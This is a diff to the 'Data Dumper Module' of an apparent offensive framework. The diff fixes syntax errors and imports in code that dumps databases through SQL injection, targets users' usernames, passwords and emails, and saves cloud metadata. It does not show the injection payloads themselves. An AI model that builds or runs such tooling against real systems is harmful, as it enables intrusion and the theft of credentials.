@@ -5,8 +5,12 @@ ATOMIC FRAMEWORK - Data Dumper Module
 Database extraction and data dumping
 """
 
-import re
 import os
+import sys
+import re
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
 from config import Config, Colors
 
 
@@ -36,7 +40,7 @@ class DataDumper:
         url = finding.url
         param = finding.param
         
-        print(f"{Colors.info(f'Attempting SQL dump from {url}')}')
+        print(f"{Colors.info(f'Attempting SQL dump from {url}')}")
         
         # Determine database type
         db_type = 'mysql'
@@ -57,7 +61,7 @@ class DataDumper:
         tables = self._get_tables(url, param, db_type)
         if tables:
             self._save_dump('tables', tables)
-            print(f"{Colors.success(f'Tables extracted: {len(tables)}')}')
+            print(f"{Colors.success(f'Tables extracted: {len(tables)}')}")
         
         # Get users (common target)
         users = self._dump_table(url, param, db_type, 'users', ['username', 'password', 'email'])
@@ -184,7 +188,7 @@ class DataDumper:
         """Dump cloud metadata"""
         if finding.extracted_data:
             self._save_dump('cloud_metadata', finding.extracted_data)
-            print(f"{Colors.success('Cloud metadata saved')}')
+            print(f"{Colors.success('Cloud metadata saved')}")
     
     def _save_dump(self, name: str, data):
         """Save dump to file"""
@@ -199,6 +203,6 @@ class DataDumper:
                 else:
                     f.write(str(data))
             
-            print(f"{Colors.info(f'Dump saved: {filepath}')}')
+            print(f"{Colors.info(f'Dump saved: {filepath}')}")
         except Exception as e:
             print(f"{Colors.error(f'Save dump error: {e}')}")
